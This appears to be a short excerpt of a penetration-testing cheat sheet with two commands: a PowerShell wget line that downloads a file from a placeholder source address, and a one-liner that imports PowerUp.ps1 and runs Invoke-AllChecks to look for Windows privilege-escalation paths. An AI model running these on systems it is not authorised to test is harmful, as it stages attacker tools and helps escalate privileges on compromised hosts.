##### Download A File To Disk
```bash
powershell -c wget "http://<Source Address>/<Source File>" -outfile "<Output File>"
```

##### Execute PowerUp.ps1
```powershell
# Run and do AllChecks in one line.
PowerShell.exe Invoke-Command -ScriptBlock { "Import-Module .\PowerUp.ps1; Invoke-AllChecks"} 
```